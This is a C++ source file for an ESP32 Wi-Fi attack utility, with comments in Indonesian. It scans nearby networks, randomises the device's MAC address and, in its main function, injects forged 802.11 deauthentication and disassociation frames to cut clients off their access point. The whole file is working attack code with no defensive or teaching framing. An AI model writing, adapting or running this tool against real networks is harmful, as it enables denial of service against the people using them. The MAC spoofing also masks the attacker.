// wifi_utils.cpp

#include "wifi_utils.h"
#include "esp_system.h"
// Fungsi random() sudah built-in di Arduino, tidak perlu include "random.h"

// Konstruktor
WiFi_Utils::WiFi_Utils(bool random_mac) {
  random_mac_enable = random_mac;
}

// Inisialisasi Wi-Fi dalam mode yang dibutuhkan untuk serangan
bool WiFi_Utils::init() {
  // --- PERBAIKAN 1: Gunakan WIFI_MODE_APSTA ---
  WiFi.mode(WIFI_MODE_APSTA); 
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE); // Set ke channel awal
  
  if (random_mac_enable) {
    changeMACAddress();
  }

  mac_address = macAddress();
  
  // --- PERBAIKAN 2: Pisahkan Serial.println untuk std::string ---
  Serial.print("Wi-Fi Utils Initialized. MAC Address: ");
  Serial.println(mac_address.c_str());
  
  isInit = true;
  return isInit;
}

// Scan jaringan Wi-Fi dan simpan dalam struktur data
wifiData WiFi_Utils::scanWifiList() {
  Serial.println("\n[INFO] Scanning networks...");
  wifi_list.ssid.clear();
  wifi_list.bssid.clear();
  wifi_list.channel.clear();
  wifi_list.signal.clear();

  int n = WiFi.scanNetworks(false, true, false, 300); // Async, show_hidden, passive, channel_time_ms
  Serial.println("[INFO] Scan complete.");
  if (n == 0) {
    Serial.println("[INFO] No networks found");
  } else {
    Serial.print((String)n + " networks found\n");
    for (int i = 0; i < n; ++i) {
      wifi_list.ssid.push_back(WiFi.SSID(i).c_str());
      wifi_list.bssid.push_back(WiFi.BSSIDstr(i).c_str());
      wifi_list.channel.push_back(WiFi.channel(i));
      wifi_list.signal.push_back(WiFi.RSSI(i));
    }
  }
  WiFi.scanDelete(); // Hapus hasil scan dari memori
  wifi_list.num = n;
  return wifi_list;
}

// Fungsi untuk mengubah alamat MAC
bool WiFi_Utils::changeMACAddress() {
  uint8_t new_mac[6];
  // Generate 3 byte acak untuk OUI (Organizationally Unique Identifier)
  // dan 3 byte acak untuk NIC (Network Interface Controller)
  for (int i = 0; i < 6; i++) {
    new_mac[i] = random(256); // Fungsi random() ini sudah built-in
  }
  // Set bit lokal dan unicast
  new_mac[0] |= 0x02; 
  new_mac[0] &= ~0x01;

  esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, new_mac);
  if (err == ESP_OK) {
    Serial.println("[INFO] MAC Address changed successfully.");
    return true;
  } else {
    Serial.println("[ERROR] Failed to change MAC Address.");
    return false;
  }
}

// Fungsi UTAMA: Mengirimkan paket Deauthentication
void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* client_mac) {
  // Struktur paket deauth
  // https://mrncciew.com/2014/10/08/802-11-mgmt-deauthentication-frame/
  uint8_t packet[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Frame Control
    /*  2 - 3  */ 0x00, 0x00,                         // Duration
    /*  4 - 9  */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination Address (client_mac)
    /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (bssid)
    /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (bssid)
    /* 22 - 23 */ 0x00, 0x00,                         // Sequence Number
    /* 24 - 25 */ 0x07, 0x00                          // Reason Code: 7 = Class 3 frame received from nonassociated STA
  };
  // --- Paket 1: Deauth dari AP ke Klien ---
  packet[0] = 0xC0; // Type: Management, Subtype: Deauthentication
  // Salin MAC address ke dalam paket
  memcpy(&packet[4], client_mac, 6);  // Tujuan adalah klien
  memcpy(&packet[10], bssid, 6);      // Sumber adalah AP
  memcpy(&packet[16], bssid, 6);      // BSSID adalah AP
  packet[22] = random(256); // Random sequence number
  // Kirim paket menggunakan fungsi level rendah ESP-IDF
  // esp_wifi_80211_tx(interface, buffer, panjang, tidak di-enqueue)
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  
  delay(1); // Beri jeda singkat agar tidak membebani buffer

  // --- Paket 2: Deauth dari Klien ke AP ---
  memcpy(&packet[4], bssid, 6);      // Destination = AP
  memcpy(&packet[10], client_mac, 6); // Source = Client
  memcpy(&packet[16], bssid, 6);     // BSSID = AP
  packet[22] = random(256); // Random sequence number
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  delay(1);

  // --- Paket 3: Disassociation dari AP ke Klien ---
  packet[0] = 0xA0; // Type: Management, Subtype: Disassociation
  memcpy(&packet[4], client_mac, 6);  // Destination = Client
  memcpy(&packet[10], bssid, 6);     // Source = AP
  memcpy(&packet[16], bssid, 6);     // BSSID = AP
  packet[22] = random(256); // Random sequence number
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  delay(1);

  // --- Paket 4: Disassociation dari Klien ke AP ---
  memcpy(&packet[4], bssid, 6);      // Destination = AP
  memcpy(&packet[10], client_mac, 6); // Source = Client
  memcpy(&packet[16], bssid, 6);     // BSSID = AP
  packet[22] = random(256); // Random sequence number
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

// Dapatkan MAC address saat ini
std::string WiFi_Utils::macAddress() {
  return WiFi.macAddress().c_str();
}